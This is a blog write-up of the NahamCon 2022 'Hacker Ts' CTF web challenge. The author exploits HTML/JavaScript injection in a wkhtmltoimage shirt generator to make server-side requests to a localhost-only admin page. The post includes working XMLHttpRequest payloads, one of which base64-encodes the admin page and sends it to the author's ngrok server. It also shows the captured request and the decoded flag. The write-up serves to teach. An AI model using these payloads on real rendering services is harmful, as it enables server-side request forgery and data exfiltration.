---
layout: post
title: "Nahamcon CTF: Hacker Ts"
image: ''
date:   2022-04-30 00:00:00
tags:
- web
- ajax
- javascript
- html-injection
- xss
- nahamcon-2022
- wkhtmltopdf
description: ''
categories:
published: true
comments: false
---

<img src="https://ctftime.org/media/events/naham_banner.png" style="width:60%;height:60%">

## Intro
Welcome back to another round of CTF writeup dumps! This time, we're taking a look at [Nahamcon 2022](https://www.nahamcon.com/) run by the cool people over at [Just Hacking](https://justhacking.com/). Unlike my [H@cktivitycon](https://an00brektn.github.io/tags/#h-cktivitycon) writeups, I'm not going to give a solution for every single challenge I solved (many of them were 1 step solutions that aren't really worth dedicating a post to), but I will be going over some that fill in some holes of content that I hadn't touched on here yet. 

The one hard-rated web challenge I solved was Hacker Ts, which was a simple web application where you could insert text to be put on an image of a t-shirt. We also quickly find a `/admin` endpoint that is only accessible from the localhost, meaning we need to find some kind of request forgery. After some playing around, we find the engine used to convert our text into the image is wkhtmltoimage, which can then be exploited using HTML injection.

* buh
{:toc}

### Description
Author: [@congon4tor](https://twitter.com/congon4tor)  
`We all love our hacker t-shirts. Make your own custom ones.`

## Exploring the Webpage
We're presented with a webpage that accepts text to be put on an image.
![asdf](https://an00brektn.github.io/img/nahamcon-2022/Pasted image 20220430210553.png)

The input says "command", but there doesn't seem to be any kind of command injection happening at all (that wouldn't really make sense anyway). In the top right, you might notice an "Admin" button. Clicking it, we're brought to a new page, but it seems there's some restriction.

![asdf](https://an00brektn.github.io/img/nahamcon-2022/Pasted image 20220430210749.png)

This is probably our end goal. Typically, when you want to try and access a page that "can only be seen internally", you're either trying to tamper with headers, or you're doing some kind of request forgery, and the latter seems more likely in this case.

After messing around with random inputs, I tried to see if I could insert HTML tags, and it seemed to work.

![asdf](https://an00brektn.github.io/img/nahamcon-2022/Pasted image 20220430212004.png)

We can also try to get a call back on our own server. I'll use ngrok to generate a url which I can then use to tunnel traffic back to my own VM since my Kali VM is behind two NATs (my physical router and then the virtual network). I'll then set up a listener to listen on port 80.

```html
<script>fetch("http://8.tcp.ngrok.io:14618/diditwork")</script>
```

The `fetch()` method in JavaScript can be used to make a GET request, which will let me test if I can make outbound requests. You can read more about it [here](https://developer.mozilla.org/en-US/docs/Web/API/fetch). The payload above is what I would normally use for a challenge like this, but we encounter a little bit of a roadbump.

![asdf](https://an00brektn.github.io/img/nahamcon-2022/Pasted image 20220430223019.png)

It seems error messages were not properly handled and the program converting the text to the image was leaked, and we now know we're working with [`wkhtmltoimage`](https://wkhtmltopdf.org/). Doing some research, it is specifically a tool to render HTML into a PDF/image. The error also suggests that we can probably still run arbitrary JS code, we might just need to change up how we're making that request. `fetch()` doesn't return text, which might be causing the tool to bug out.

With all the pieces in place, we can now craft a payload.

## Grabbing the Flag 
### A Brief Lesson on AJAX
[AJAX](https://www.w3schools.com/js/js_ajax_intro.asp) stands for "Asynchronous JavaScript and XML" and is a name for a technology that allows a webpage to make requests in the background without interfering with the display of the current page. In JavaScript, we can use the `XMLHttpRequest` object to make asynchronous requests, and actually have the ability to handle the response text itself (kind of like how you would with Python requests).

For example, take a look at the following:
```js
// https://www.w3schools.com/js/js_ajax_intro.asp
function loadDoc() {  
  const xhttp = new XMLHttpRequest();  
  xhttp.onload = function() {  
    document.getElementById("demo").innerHTML = this.responseText;  
    }  
  xhttp.open("GET", "ajax_info.txt", true);  
  xhttp.send();  
}
```

To break this down, we start by creating a new `XMLHttpRequest` object, and then defining the `onload` attribute, which tells the object what to do with the response that is recieved. In this case, it takes the HTML element with the ID of "demo", and replaces is with the text of the response. We then finish it out by making the actual request with `open()` and `send()`.

Got all that? Cool. If you didn't, just think of it as a way to make web requests from a webpage. For our purposes, we can take this concept, and either print the response directly to the shirt, or send it to a server that we control.

### Payload All The Things!
<sup>not affiliated with PayloadsAllTheThings</sup>

Our first payload will put the response on the shirt itself. I'll have it formatted nicely for the sake of the blog, but I'll have it all on one line when I actually exploit.
```html
<div id='stuff'>a</div>
<script>
	x = new XMLHttpRequest(); 
	x.open('GET','http://localhost:5000/admin',false); 
	x.send(); 
	document.getElementById('stuff').innerHTML= x.responseText; 
</script>
```

Here, we make the request to the `admin` page, but we do a little HTML work to get the page contents to actually show up on the shirt. We define an HTML element 'stuff' with some filler text so we can later use `document.getElementById('stuff').innerHTML` to replace it with the contents of the response, in this case, the admin page. If we submit this, we get a new shirt.

![asdf](https://an00brektn.github.io/img/nahamcon-2022/Pasted image 20220430225154.png)

Ok, that's cool and all, and you could definitely type out the flag, but I'm lazy, and I really want to copy and paste. Instead of printing to the shirt, we can actually just use a second `XMLHttpRequest` to make a request to our own webserver so we can actually get text that we can mess with. Our payload then becomes slightly larger.

```html
<script>
	x = new XMLHttpRequest(); 
	x.open('GET','http://localhost:5000/admin',false); 
	x.send(); y = new XMLHttpRequest(); 
	y.open('GET', 'http://8.tcp.ngrok.io:14618/request?q=' + btoa(x.responseText)); 
	y.send();
</script>
```

The only thing that's changed here is that instead of replacing a `div` element with the response text, we're going to send it to a server we control. You could also probably use a webhook, but this is what came to mind first. The `btoa(x.responseText)` will convert the data we send into base64. That way, I can decode it locally and make sure that none of the special characters in the HTML get eaten up. If we send this payload, we don't see anything on the T-Shirt.

![asdf](https://an00brektn.github.io/img/nahamcon-2022/Pasted image 20220430225733.png)

But, if we look at our webserver:

```http
GET /request?q=PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KICA8aGVhZD4KICAgIDxtZXRhIGNoYXJzZXQ9InV0Zi04IiAvPgogICAgPG1ldGEKICAgICAgbmFtZT0idmlld3BvcnQiCiAgICAgIGNvbnRlbnQ9IndpZHRoPWRldmljZS13aWR0aCwgaW5pdGlhbC1zY2FsZT0xLCBzaHJpbmstdG8tZml0PW5vIgogICAgLz4KCiAgICA8bGluawogICAgICByZWw9InN0eWxlc2hlZXQiCiAgICAgIGhyZWY9Imh0dHBzOi8vY2RuLmpzZGVsaXZyLm5ldC9ucG0vYm9vdHN0cmFwQDUuMC4yL2Rpc3QvY3NzL2Jvb3RzdHJhcC5taW4uY3NzIgogICAgICBjcm9zc29yaWdpbj0iYW5vbnltb3VzIgogICAgLz4KCiAgICA8bGluawogICAgICBocmVmPSJodHRwczovL2ZvbnRzLmdvb2dsZWFwaXMuY29tL2NzczI/ZmFtaWx5PVZUMzIzJmRpc3BsYXk9c3dhcCIKICAgICAgcmVsPSJzdHlsZXNoZWV0IgogICAgLz4KCiAgICA8dGl0bGU+SGFja2VyIFRzPC90aXRsZT4KICA8L2hlYWQ+CgogIDxib2R5PgogICAgPCEtLSBOYXZpZ2F0aW9uIC0tPgogICAgPG5hdiBjbGFzcz0ibmF2YmFyIG5hdmJhci1leHBhbmQtbWQgbmF2YmFyLWRhcmsgYmctZGFyayI+CiAgICAgIDxkaXYgY2xhc3M9ImNvbnRhaW5lciI+CiAgICAgICAgPGEgY2xhc3M9Im5hdmJhci1icmFuZCIgaHJlZj0iLyIKICAgICAgICAgID48c3BhbiBjbGFzcz0iIiBzdHlsZT0iZm9udC1mYW1pbHk6ICdWVDMyMyc7IGZvbnQtc2l6ZTogNDBweCIKICAgICAgICAgICAgPkhhY2tlciBUczwvc3BhbgogICAgICAgICAgPjwvYQogICAgICAgID4KICAgICAgPC9kaXY+CiAgICA8L25hdj4KCiAgICA8IS0tIFBhZ2UgQ29udGVudCAtLT4KICAgIDxkaXYgY2xhc3M9ImNvbnRhaW5lciI+CiAgICAgIDxkaXYgY2xhc3M9ImFsZXJ0IGFsZXJ0LXN1Y2Nlc3MgbXQtNSI+CiAgICAgICAgSGkgYWRtaW4hIGhlcmUgaXMgeW91ciBmbGFnOgogICAgICAgIDxzdHJvbmc+ZmxhZ3s0NjFlMjQ1MjA4OGViMzk3YjYxMzhhNTkzNGFmNjIzMX08L3N0cm9uZz4KICAgICAgPC9kaXY+CiAgICA8L2Rpdj4KICAgIDwhLS0gLy5jb250YWluZXIgLS0+CiAgPC9ib2R5PgoKICA8IS0tIEJvb3RzdHJhcCBKUyAtLT4KICA8c2NyaXB0CiAgICBzcmM9Imh0dHBzOi8vY2RuLmpzZGVsaXZyLm5ldC9ucG0vYm9vdHN0cmFwQDUuMC4yL2Rpc3QvanMvYm9vdHN0cmFwLmJ1bmRsZS5taW4uanMiCiAgICBjcm9zc29yaWdpbj0iYW5vbnltb3VzIgogID48L3NjcmlwdD4KPC9odG1sPg== HTTP/1.1
Origin: file://
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.34 (KHTML, like Gecko) wkhtmltoimage Safari/534.34
Accept: */*
Connection: Keep-Alive
Accept-Encoding: gzip
Accept-Language: en,*
Host: 8.tcp.ngrok.io:14618
```

> Note: Instead of using a netcat listener, I actually like using my own HTTP server script because I've found that it works a little cleaner. When I did this with netcat, the webserver hung, but when I did it with my script, the webserver showed an empty shirt.

If we decode the Base 64, we can get the flag.

```shell
kali@transistor:~/ctf/nahamcon/web_hacker_ts$ echo 'PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KICA8aGVhZD4KICAgIDxtZXRhIGNoYXJzZXQ9In...snip...tb3VzIgogID48L3NjcmlwdD4KPC9odG1sPg==' | base64 -d
<!DOCTYPE html>
<html lang="en">
  ...snip...
    <title>Hacker Ts</title>
  </head>

  <body>
    <!-- Navigation -->
    <nav class="navbar navbar-expand-md navbar-dark bg-dark">
      <div class="container">
        <a class="navbar-brand" href="/"
          ><span class="" style="font-family: 'VT323'; font-size: 40px"
            >Hacker Ts</span
          ></a
        >
      </div>
    </nav>

    <!-- Page Content -->
    <div class="container">
      <div class="alert alert-success mt-5">
        Hi admin! here is your flag:
        <strong>flag{461e2452088eb397b6138a5934af6231}</strong>
      </div>
    </div>
...snip...
</html>
```

And that's the flag.

